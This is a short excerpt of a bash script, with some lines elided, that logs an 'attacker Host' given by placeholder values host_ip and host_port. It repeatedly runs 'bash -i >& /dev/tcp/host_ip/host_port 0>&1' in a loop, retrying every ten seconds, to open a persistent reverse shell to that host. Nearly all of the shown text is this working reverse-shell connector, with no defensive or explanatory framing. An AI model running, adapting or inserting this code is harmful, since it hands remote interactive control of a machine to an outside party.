...
log "attacker Host: host_ip:host_port"
server="host_ip"
timeout=600
start_time=$(date +%s)
...
while true; do
    ...
    log "running: /bin/bash -c 'bash -i >& /dev/tcp/host_ip/host_port 0>&1'"
    while ! /bin/bash -c 'bash -i >& /dev/tcp/host_ip/host_port 0>&1'; do
        log "reconnecting: host_ip:host_port";
        sleep 10;
    done;
